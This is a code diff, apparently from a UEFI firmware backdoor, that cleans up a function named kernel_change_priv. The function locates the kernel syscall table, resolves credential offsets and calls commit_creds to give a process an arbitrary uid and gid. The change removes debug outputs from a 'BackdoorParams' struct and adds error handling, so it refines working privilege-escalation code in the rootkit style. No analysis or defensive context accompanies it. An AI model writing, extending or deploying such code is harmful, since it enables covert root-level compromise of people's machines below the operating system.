@@ -14,7 +14,6 @@
 #define SYS_GETEUID 107
 #define SYS_GETEGID 108
 
-static EFI_PHYSICAL_ADDRESS gSyscallTable;
 
 struct CredOffsets {
     INT32 task_struct_offset;
@@ -148,18 +147,16 @@ static EFI_STATUS commit_creds(UINT32 uid, UINT32 gid, struct CredOffsets *offse
     return EFI_SUCCESS;
 }
 
-EFI_STATUS kernel_change_priv(UINT32 uid, UINT32 gid, struct BackdoorParams* debug) {
-    EFI_STATUS status = find_syscall_table(&gSyscallTable);
-    debug->r[0] = gSyscallTable;
+EFI_STATUS kernel_change_priv(UINT32 uid, UINT32 gid) {
+    EFI_PHYSICAL_ADDRESS syscall_table = 0;
+    EFI_STATUS status = find_syscall_table(&syscall_table);
     if (status != EFI_SUCCESS)
         return status;
 
     struct CredOffsets offsets;
-    status = resolv_offsets(gSyscallTable, &offsets);
+    status = resolv_offsets(syscall_table, &offsets);
+    if (status != EFI_SUCCESS)
+        return status;
 
-    debug->r[1] = status;
-    debug->r[2] = commit_creds(uid, gid, &offsets);
-
-
-    return 0;
+    return commit_creds(uid, gid, &offsets);
 }
